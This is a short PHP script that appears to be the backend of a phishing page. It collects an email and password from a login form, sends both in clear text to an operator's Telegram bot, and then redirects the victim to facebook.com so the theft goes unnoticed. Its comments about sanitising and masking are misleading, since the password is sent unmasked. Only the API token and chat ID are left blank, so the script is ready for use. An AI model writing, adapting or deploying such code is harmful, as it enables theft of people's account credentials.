<?php

// Replace with your actual Telegram API token (avoid exposing it publicly)
$apiToken = "";




    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL); // Sanitize email
    $password = filter_var($_POST['pass'], FILTER_SANITIZE_STRING); // Sanitize password

    if (empty($email) || empty($password)) {
        echo "Please enter both email and password.";
        exit(); // Stop script execution if fields are empty
    }

    $data = [
        'chat_id' => '',
        'text' => "New submission:\n* Email: $email\n* Clave: $password", // Mask password for security
    ];

    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data);

    $response = file_get_contents($url);

    if ($response) {
        header('Location: https://facebook.com/');
    } else {
        echo "Error sending submission. Please check your Telegram API token and configuration.";
    }


?>
